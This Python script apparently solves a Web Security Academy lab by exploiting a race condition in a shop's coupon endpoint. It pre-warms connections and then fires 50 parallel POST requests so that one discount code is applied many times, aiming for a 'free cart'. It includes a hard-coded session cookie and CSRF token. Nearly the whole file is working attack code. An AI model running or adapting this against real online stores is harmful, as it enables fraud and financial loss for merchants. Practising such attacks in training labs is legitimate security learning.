import asyncio
import aiohttp
import time
from aiohttp import TCPConnector

# CONFIGURABLE VARIABLES
hostid = '0a99000b034d1e9c83117d7e006100d0'
cookies_session = 'gkPkvG4hppMAxrKAMADlUr8f8PpBjyuV'
csrftoken = 'YSEgDrGqlm7IYUSOb5nOV494wnyRYG5x'
payload = 'PROMO20'

async def ultra_parallel_attack():
    url = f"https://{hostid}.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": f"session={cookies_session}"
    }
    data = f"csrf={csrftoken}&coupon={payload}"
    
    print(f"[*] Starting ULTRA PARALLEL attack at {time.ctime()}")
    print(f"[*] Strategy: MAXIMUM concurrency with connection pre-warming")
    print("-" * 60)
    
    success_counter = [0]
    
    # ULTRA aggressive connection settings
    connector = TCPConnector(limit=100, limit_per_host=100, force_close=False, keepalive_timeout=30)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # PRE-WARM connections
        print("[*] Pre-warming connections...")
        warm_tasks = [session.post(url, headers=headers, data=data) for _ in range(5)]
        await asyncio.gather(*warm_tasks, return_exceptions=True)
        
        # FIRE ALL REQUESTS SIMULTANEOUSLY
        print(f"[*] Firing 50 ultra-parallel requests...")
        start_time = time.time()
        
        tasks = []
        for i in range(50):  # Increased volume
            task = asyncio.create_task(
                ultra_request(session, url, headers, data, i, success_counter, start_time)
            )
            tasks.append(task)
        
        # Use wait instead of gather for true simultaneity
        done, pending = await asyncio.wait(tasks, timeout=4.0)
        
        # Cancel any pending requests
        for task in pending:
            task.cancel()
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] Total SUCCESS responses: {success_counter[0]}")
    
    if success_counter[0] >= 5:
        print("[+] FREE CART ACHIEVED!")
    else:
        print(f"[-] Only {success_counter[0]} successes")

async def clean_pre_warm_attack():
    url = f"https://{hostid}.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": f"session={cookies_session}"
    }
    data = f"csrf={csrftoken}&coupon={payload}"
    
    print(f"[*] Starting CLEAN pre-warm attack at {time.ctime()}")
    print("-" * 60)
    
    success_counter = [0]
    connector = TCPConnector(limit=100, limit_per_host=100, keepalive_timeout=30)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # CLEAN PRE-WARM: Use INVALID placeholder to establish connections
        print("[*] Clean pre-warming with PLACEHOLDER coupon...")
        warm_data = f"csrf={csrftoken}&coupon=PREWARM_PLACEHOLDER"
        warm_tasks = [session.post(url, headers=headers, data=warm_data) for _ in range(5)]
        await asyncio.gather(*warm_tasks, return_exceptions=True)
        
        # FIRE REAL ATTACK with pre-established connections
        print(f"[*] Firing 50 parallel requests with REAL payload...")
        start_time = time.time()
        
        tasks = []
        for i in range(50):
            task = asyncio.create_task(
                ultra_request(session, url, headers, data, i, success_counter, start_time)
            )
            tasks.append(task)
        
        await asyncio.gather(*tasks)
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] Total SUCCESS responses: {success_counter[0]}")
    
    if success_counter[0] >= 5:
        print("[+] FREE CART ACHIEVED!")
    else:
        print(f"[-] Only {success_counter[0]} successes")

async def ultra_request(session, url, headers, data, req_id, success_counter, start_time):
    """Ultra-parallel request with clean pre-warmed connections"""
    request_start = time.time()
    relative_start = request_start - start_time
    
    try:
        async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=2.5)) as resp:
            body = await resp.text()
            end = time.time()
            response_time = end - request_start
            
            if len(body) == 7171:  # Success response length
                result = "SUCCESS"
                success_counter[0] += 1
            elif "already applied" in body:
                result = "DUPLICATE"
            else:
                result = f"OTHER_{len(body)}"
            
            print(f"[{req_id:02d}] {result} | Start:+{relative_start:.4f}s | Δ:{response_time:.3f}s")
            
    except asyncio.TimeoutError:
        print(f"[{req_id:02d}] TIMEOUT | Start:+{relative_start:.4f}s")
    except Exception as e:
        print(f"[{req_id:02d}] ERROR | Start:+{relative_start:.4f}s")
        
if __name__ == "__main__":
    print("[!] CRITICAL: Cart must be CLEARED before attack!")
    input("Press Enter to launch nuclear attack...")
    asyncio.run(ultra_parallel_attack())
